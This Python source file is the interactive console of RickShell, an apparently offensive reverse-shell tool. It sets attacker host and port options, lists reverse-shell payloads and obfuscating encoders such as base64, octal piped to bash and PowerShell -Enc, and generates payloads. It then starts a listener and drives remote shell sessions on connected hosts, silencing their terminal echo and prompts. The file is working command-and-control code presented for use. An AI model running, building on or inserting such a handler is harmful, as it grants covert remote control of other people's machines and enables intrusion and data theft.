import cmd
import difflib
import re
import select
import sys
import threading
import time
from typing import Optional

from core.listener import Listener
from core.session_manager import SessionManager
from core.utils import get_network_interfaces
from interface.colors import Colors
from modules.builder import PayloadBuilder
from modules.encoders import Encoders
from modules.payloads import PayloadDatabase


BANNER = r"""
  ______  _      _     _____ _          _ _ 
  | ___ \(_)    | |   /  ___| |        | | |
  | |_/ / _  ___| | __\ `--.| |__   ___| | |
  |    / | |/ __| |/ / `--. \ '_ \ / _ \ | |
  | |\ \ | | (__|   </\__/ / | | |  __/ | |
  \_| \_|_|\___|_|\_\\____/|_| |_|\___|_|_|
"""

_ANSI_ESCAPE = re.compile(
    r'(\x9B|\x1B\[)[0-?]*[ -/]*[@-~]'
    r'|\x1B[@-_]'
    r'|\x1B[^@-_]'
    r'|[\x00-\x08\x0b-\x0c\x0e-\x1f\x7f]'
)

_SHELL_PROMPT = re.compile(
    r'^[^\s]*[\$#]\s*$'
    r'|^[^\s]+@[^\s]+:[^\s]*[\$#]\s*'
    r'|^\s*[┌└─╭╰│╔╚═].*$'
)

_SETUP_CMDS = (
    'export TERM=dumb\n'
    'export PS1=""\n'
    'export PS2=""\n'
    'stty -echo 2>/dev/null\n'
    'unalias ls 2>/dev/null; alias ls="ls --color=never -1"\n'
)


def _clean_output(raw: bytes) -> list:
    text = raw.decode(errors='replace')
    text = _ANSI_ESCAPE.sub('', text)
    segments = re.split(r'\r\n|\r|\n', text)
    lines = []
    for seg in segments:
        seg = seg.strip()
        if not seg:
            continue
        if _SHELL_PROMPT.match(seg):
            continue
        seg = re.sub(r' {3,}', '  ', seg)
        lines.append(seg)
    return lines


def _table(headers, rows, col_width=22):
    header_line = '  '.join(h.ljust(col_width) for h in headers)
    sep = '  '.join('-' * col_width for _ in headers)
    body = '\n'.join('  '.join(str(c).ljust(col_width) for c in row) for row in rows)
    return f"{Colors.bold(header_line)}\n{Colors.dim(sep)}\n{body}"


class ConsoleInterface(cmd.Cmd):
    intro = (
        f"{Colors.HEADER}{Colors.BOLD}{BANNER}{Colors.ENDC}\n"
        f"{Colors.DIM}  Type 'help' for available commands.\n{Colors.ENDC}"
    )
    prompt = (
        f"{Colors.BOLD}{Colors.FAIL}Rick{Colors.ENDC}"
        f"{Colors.BOLD}{Colors.WARNING}Shell{Colors.ENDC}"
        f"{Colors.BOLD} > {Colors.ENDC}"
    )

    def __init__(self):
        super().__init__()
        self.session_manager = SessionManager()
        self.builder = PayloadBuilder()
        self.active_listener = None

    def _listener_alive(self):
        return (
            self.active_listener is not None
            and self.active_listener.is_alive()
            and self.active_listener.is_running
        )

    def _start_listener(self):
        lhost = self.builder._resolve_lhost()
        lport = self.builder._resolve_lport()

        if not lhost:
            print(Colors.error("[!] LHOST is not configured. Cannot start listener."))
            return

        if self._listener_alive():
            print(Colors.warn(f"[!] Listener already running on port {self.active_listener.port}."))
            return

        self.active_listener = Listener(
            host=lhost,
            port=lport,
            session_manager=self.session_manager,
        )
        self.active_listener.start()

    def postcmd(self, stop, line):
        if self.active_listener is not None and not self._listener_alive():
            self.active_listener = None
        return stop

    def do_show(self, line):
        arg = line.strip().lower()

        if arg == 'options':
            opts = self.builder.get_options()
            rows = [[k, v] for k, v in opts.items()]
            print(f"\n{_table(['Option', 'Value'], rows)}\n")

        elif arg == 'interfaces':
            ifaces = get_network_interfaces()
            if not ifaces:
                print(Colors.warn("[*] No network interfaces found."))
                return
            rows = [[name, ip] for name, ip in ifaces.items()]
            print(f"\n{_table(['Interface', 'IPv4 Address'], rows)}\n")

        elif arg == 'payloads':
            print(f"\n{Colors.bold('Available Payload Keys:')}\n{Colors.dim('-' * 50)}")
            for lang in PayloadDatabase.all_languages():
                keys = PayloadDatabase.get_keys_by_language(lang)
                print(Colors.warn(f"  [{lang.upper()}]"))
                for k in keys:
                    print(f"    {Colors.CYAN}{k}{Colors.ENDC}")
            print()

        elif arg == 'encoders':
            rows = [
                ['none', 'No encoding, raw payload'],
                ['base64', 'Base64 + shell-aware wrapper'],
                ['url', 'URL encoding + python exec wrapper'],
                ['hex', 'Hex encoding + decode wrapper'],
                ['octal', 'Octal escape + echo -e | bash'],
                ['ps_base64', 'UTF-16LE Base64 for PowerShell -Enc'],
            ]
            print(f"\n{_table(['Encoder', 'Description'], rows, col_width=18)}\n")

        else:
            print(Colors.warn("[!] Usage: show [options|interfaces|payloads|encoders]"))

    _VALID_KEYS = ['lhost', 'lport', 'interface', 'payload', 'encoder']

    def _fuzzy_key(self, raw):
        lower = raw.lower()
        if lower in self._VALID_KEYS:
            return lower
        matches = difflib.get_close_matches(lower, self._VALID_KEYS, n=1, cutoff=0.6)
        if matches:
            corrected = matches[0]
            print(Colors.warn(f"[~] Auto-corrected '{raw}' -> '{corrected}'"))
            return corrected
        return lower

    def do_set(self, line):
        parts = line.strip().split(None, 1)
        if len(parts) != 2:
            print(Colors.warn("[!] Usage: set <OPTION> <VALUE>"))
            return
        raw_key, value = parts
        key = self._fuzzy_key(raw_key)
        if self.builder.set_option(key, value):
            print(Colors.success(f"[+] {key.upper()} => {value}"))
        else:
            valid_map = {
                'encoder': f"Valid: {', '.join(Encoders.SUPPORTED)}",
                'payload': 'Use `show payloads` to see valid keys',
                'interface': 'Use `show interfaces` to see available interfaces',
                'lhost': 'Must be a valid IPv4 address (e.g. 10.10.10.10)',
                'lport': 'Must be an integer between 1-65535',
            }
            hint = valid_map.get(key, 'Check the value and try again.')
            print(Colors.error(f"[!] Invalid value for {key.upper()}. {hint}"))

    def do_generate(self, _line):
        try:
            payload = self.builder.generate()
            print(f"\n{Colors.bold(Colors.GREEN + '[+] Generated Payload:' + Colors.ENDC)}")
            print(f"\n  {Colors.CYAN}{payload}{Colors.ENDC}\n")
            lport = self.builder.LPORT
            try:
                answer = input(
                    Colors.warn(f"[?] Start listener on port {lport}? (y/n): ")
                ).strip().lower()
            except (EOFError, KeyboardInterrupt):
                print()
                return
            if answer == 'y':
                self.do_listen('')
        except ValueError as exc:
            print(Colors.error(f"[!] {exc}"))

    def do_listen(self, _line):
        self._start_listener()

    def do_sessions(self, _line):
        sessions = self.session_manager.list_sessions()
        if not sessions:
            print(Colors.warn("[*] No active sessions."))
            return
        rows = [[s.id, s.ip, s.port] for s in sessions]
        print(f"\n{_table(['ID', 'IP Address', 'Port'], rows, col_width=18)}\n")

    def do_interact(self, line):
        line = line.strip()
        if not line.isdigit():
            print(Colors.warn("[!] Usage: interact <session_id>"))
            return
        session_id = int(line)
        session = self.session_manager.get_session(session_id)
        if not session:
            print(Colors.error(f"[!] Session {session_id} not found."))
            return

        print(Colors.success(
            f"[*] Entering session {session_id} ({session.ip}:{session.port})"
        ))
        print(Colors.dim("    Type 'background' or Ctrl+C to return to main menu.\n"))

        sock = session.conn
        sock.setblocking(True)
        try:
            sock.sendall(_SETUP_CMDS.encode())
        except Exception:
            pass

        time.sleep(0.6)
        sock.setblocking(False)
        try:
            while True:
                r, _, _ = select.select([sock], [], [], 0)
                if not r:
                    break
                sock.recv(8192)
        except Exception:
            pass

        SENTINEL = '__RICKSHELL_DONE__'
        stop_event = threading.Event()
        output_ready = threading.Event()
        output_ready.set()

        def _drain():
            buf = b''
            while not stop_event.is_set():
                try:
                    r, _, _ = select.select([sock], [], [], 0.15)
                    if not r:
                        continue
                    chunk = sock.recv(4096)
                    if not chunk:
                        sys.stdout.write(
                            f"\n{Colors.warn('[*] Remote host closed the connection.')}\n"
                        )
                        sys.stdout.flush()
                        stop_event.set()
                        output_ready.set()
                        break
                    buf += chunk
                    if SENTINEL.encode() in buf:
                        before = buf.split(SENTINEL.encode())[0]
                        if before:
                            for out_line in _clean_output(before):
                                sys.stdout.write(f"  {Colors.GREEN}{out_line}{Colors.ENDC}\r\n")
                            sys.stdout.flush()
                        buf = b''
                        output_ready.set()  
                    elif b'\n' in buf or b'\r' in buf or len(buf) > 1024:
                        last_nl = max(buf.rfind(b'\n'), buf.rfind(b'\r'))
                        if last_nl != -1:
                            to_print = buf[:last_nl + 1]
                            buf = buf[last_nl + 1:]
                            for out_line in _clean_output(to_print):
                                sys.stdout.write(f"  {Colors.GREEN}{out_line}{Colors.ENDC}\r\n")
                            sys.stdout.flush()
                except Exception:
                    stop_event.set()
                    output_ready.set()
                    break

        drain_thread = threading.Thread(target=_drain, daemon=True)
        drain_thread.start()

        prompt = (
            f"{Colors.BOLD}{Colors.FAIL}rickshell{Colors.ENDC}"
            f"{Colors.WARNING}(session:{session_id}){Colors.ENDC}"
            f"{Colors.BOLD} # {Colors.ENDC}"
        )

        try:
            while not stop_event.is_set():
                output_ready.wait()
                if stop_event.is_set():
                    break

                try:
                    cmd = input(prompt)
                except EOFError:
                    break
                except KeyboardInterrupt:
                    print()
                    output_ready.set()
                    continue

                if not cmd.strip():
                    continue

                if cmd.strip().lower() in ('background', 'bg'):
                    break

                try:
                    sock.setblocking(True)
                    full_cmd = f"{cmd}\necho {SENTINEL}\n"
                    sock.sendall(full_cmd.encode())
                    sock.setblocking(False)
                    output_ready.clear()  
                except OSError as exc:
                    print(Colors.error(f"[!] Send failed: {exc}"))
                    self.session_manager.remove_session(session_id)
                    break
        finally:
            stop_event.set()
            output_ready.set()
            drain_thread.join(timeout=1.0)
            print(Colors.info("[*] Returning to main menu..."))

    def do_exit(self, _line):
        print(Colors.warn("\n[*] Shutting down RickShell..."))
        if self.active_listener:
            self.active_listener.stop()
        self.session_manager.close_all()
        sys.exit(0)

    def do_EOF(self, line):
        self.do_exit(line)

    def default(self, line):
        print(Colors.error(f"[!] Unknown command: '{line}'. Type 'help' for usage."))

    def emptyline(self):
        pass
